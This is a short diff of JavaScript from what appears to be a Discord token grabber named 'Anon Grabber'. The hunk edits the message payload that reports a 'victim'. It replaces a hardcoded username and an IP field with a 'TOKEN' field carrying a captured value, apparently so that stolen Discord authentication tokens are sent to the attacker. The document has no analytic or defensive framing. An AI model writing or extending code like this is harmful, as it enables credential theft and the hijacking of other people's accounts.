@@ -12,11 +12,11 @@ var params = {
         description: "Found A victim on discord using Anon Grabber",
         fields: [{
             name: "Username",
-            value: "Zeth",
+            value: "Unknown",
             inline: !1
         }, {
-            name: "IP",
-            value: "9.7.5.1",
+            name: "TOKEN",
+            value: msg,
             inline: !1
         }]
     }],
